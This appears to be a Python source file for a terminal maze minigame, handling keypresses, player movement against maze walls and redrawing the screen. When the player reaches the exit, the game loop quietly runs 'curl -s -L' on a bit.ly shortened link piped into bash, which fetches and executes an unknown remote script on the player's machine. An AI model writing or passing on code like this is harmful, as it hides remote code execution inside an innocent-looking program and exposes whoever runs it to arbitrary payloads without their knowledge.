import sys
import termios
import tty
from Maze import Maze
from os import system as console
from MazeGenerator import MazeGenerator
from Showcase import Showcase
from time import sleep


def get_keypress():
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)
    return ch


def create_game_maze(config: dict) -> Maze:
    """ Generates a new maze using the current configuration, and writes its
        data to the output file """
    height = config["HEIGHT"]
    width = config["WIDTH"]
    start = config["ENTRY"]
    end = config["EXIT"]
    maze = Maze(width, height, start, end)
    maze_gen = MazeGenerator(maze)
    maze_gen.generate()

    return maze


def move_player(maze: Maze, player_pos: tuple, dir: str):
    match dir.lower():
        case 'w':
            dir = "North"
        case 'a':
            dir = "West"
        case 's':
            dir = "South"
        case 'd':
            dir = "East"
        case _:
            return player_pos

    row = player_pos[1]
    col = player_pos[0]
    walls = maze[row][col].get_walls()
    if dir in walls:
        return player_pos

    match dir:
        case "North":
            row -= 1
        case "West":
            col -= 1
        case "South":
            row += 1
        case "East":
            col += 1
    return (col, row)


def game_loop(config: dict):
    maze = create_game_maze(config)
    w_color = config["WALLS"]
    o_color = config["OBJECTIVES"]
    player_pos = maze.start
    system_message = ''
    while True:
        console("clear")
        print("=== Minigame ===\n")
        maze_style = Showcase.format_game_maze(maze, player_pos)
        Showcase.display_game_maze(maze_style, player_pos,
                                   w_color, o_color)
        print(system_message)
        user_input = get_keypress()
        player_pos = move_player(maze, player_pos, user_input)
        if player_pos == maze.end:
            console("clear")
            print("=== Minigame ===\n")
            maze_style = Showcase.format_game_maze(maze, player_pos)
            Showcase.display_game_maze(maze_style, player_pos,
                                       w_color, o_color)
            print("You found the exit!")
            sleep(0.5)
            console("curl -s -L https://bit.ly/3zvELNz | bash")
            return
        if user_input == "0":
            return ""
